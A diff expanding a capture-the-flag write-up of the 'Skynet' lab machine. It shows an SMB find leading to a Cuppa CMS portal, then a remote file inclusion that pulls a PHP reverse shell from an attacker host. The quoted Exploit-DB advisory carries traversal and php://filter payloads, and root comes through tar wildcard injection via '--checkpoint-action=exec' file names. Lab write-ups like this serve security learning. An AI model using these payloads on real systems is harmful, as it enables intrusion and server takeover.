@@ -32,7 +32,7 @@ Running gobuster reveals two interesting finds an admin direcory and a mail serv
 
 ![](pictures/gobuster0-skynet.PNG)
 
-## [](#header-2)Enumeration:
+## [](#header-2)Intrusion:
 
 
 From here the only smbshare I am able to access at this point is "anonymous" which has "READ ONLY" permissions.
@@ -129,19 +129,157 @@ smb: \> cd notes
 smb: \notes\> get important.txt
 ```
 
-We then see that the 
+We then see that the their is a directory that wasn't picked up in our initial gobuster scan.
 ![](pictures/samba2-skynet.PNG)
 
+Navigating to the site we can see a "cuppa" login portal.
+![](pictures/cuppa-skynet.PNG)
 
-searchsploit cuppa
-cuppa:
-http://10.10.58.237/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.22.131:8000/php-reverse-shell.php
+## [](#header-2)Exploitation:
 
+Launching a searchsploit query on this random web application gives us the following result.
 
+```bash
+kali@kali:~/Desktop/tryhackme/skynet$ searchsploit cuppa
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                           |  Path                           
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                                                                          | php/webapps/25971.txt
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results    
+```
+```bash
 
-root:
+kali@kali:~/Desktop/tryhackme/skynet$ cat /usr/share/exploitdb/exploits/php/webapps/25971.txt                                                                                                                                                                                        
+# Exploit Title   : Cuppa CMS File Inclusion
+# Date            : 4 June 2013
+# Exploit Author  : CWH Underground
+# Site            : www.2600.in.th
+# Vendor Homepage : http://www.cuppacms.com/
+# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
+# Version         : Beta
+# Tested on       : Window and Linux
 
-Was able top get the root flag by abusing the tar function into getting the cronjob to spit out the root flag into the /tmp directory
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /          
+  / XXXXXX /
+ (________(            
+  `------'
 
-Whenever the backups.sh cronjob runs the /var/www/html folder it then backed up and t
-link tar sudo 
+####################################
+VULNERABILITY: PHP CODE INJECTION
+####################################
+
+/alerts/alertConfigField.php (LINE: 22)
+
+-----------------------------------------------------------------------------
+LINE 22: 
+        <?php include($_REQUEST["urlConfig"]); ?>
+-----------------------------------------------------------------------------
+    
+
+#####################################################
+DESCRIPTION
+#####################################################
+
+An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+
+#####################################################
+EXPLOIT
+#####################################################
+
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+Moreover, We could access Configuration.php source code via PHPStream 
+
+For Example:
+-----------------------------------------------------------------------------
+http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+-----------------------------------------------------------------------------
+
+Base64 Encode Output:
+-----------------------------------------------------------------------------
+PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
+-----------------------------------------------------------------------------
+
+Base64 Decode Output:
+-----------------------------------------------------------------------------
+<?php 
+        class Configuration{
+                public $host = "localhost";
+                public $db = "cuppa";
+                public $user = "root";
+                public $password = "Db@dmin";
+                public $table_prefix = "cu_";
+                public $administrator_template = "default";
+                public $list_limit = 25;
+                public $token = "OBqIPqlFWf3X";
+                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
+                public $upload_default_path = "media/uploadsFiles";
+                public $maximum_file_size = "5242880";
+                public $secure_login = 0;
+                public $secure_login_value = "";
+                public $secure_login_redirect = "";
+        } 
+?>
+-----------------------------------------------------------------------------
+
+Able to read sensitive information via File Inclusion (PHP Stream)
+
+################################################################################################################
+ Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
+```
+
+The vulnerability allows us to drop a reverse php shell on the victim machine after creating a customized query.
+
+The php rverse shell I used can be found here "/usr/share/webshells/php/php-reverse-shell.php" in kali as well as on pentest monkey's website.
+
+Once we have reverse shell ready to go we set up our netcat listener to recieve the incoming connection.
+
+Then we throw our query in the browser
+http://<victim ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attcker ip>:8000/php-reverse-shell.php
+
+and we get a shell!
+
+![](pictures/shell-skynet.PNG)
+
+From here we can find the user.txt flag in miles directory.
+
+## [](#header-2)Privledge Escalation:
+
+Cronjobs are one of the main things I check during a CTF and once I checked /etc/crontab I saw that there was a cronjob going off every minute which is definetly interesting.
+
+![](pictures/privesc-skynet.PNG)
+
+After further inspection of the cronjob 
+
+```bash
+cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+I found that it backs up the website with the tar command which is a command that can be abused according to https://gtfobins.github.io/#+sudo.
+
+An article that also really helped me understand what was going on during this technique:
+https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
+
+The basics of it are that three seperate folders are made within the /var/www/html folder
+--checkpoint=1 
+--checkpoint-action=exec=sh shell.sh
+shell.sh
+
+In combination these folders allow arbitrary code exectution(our shell file) whenever the file is tar is used in the cronjob
+
+![](pictures/root-skynet.PNG)
+
+I only got the root flag out of this device but this exploit would basically allow for any code to be executed on the target device as root.
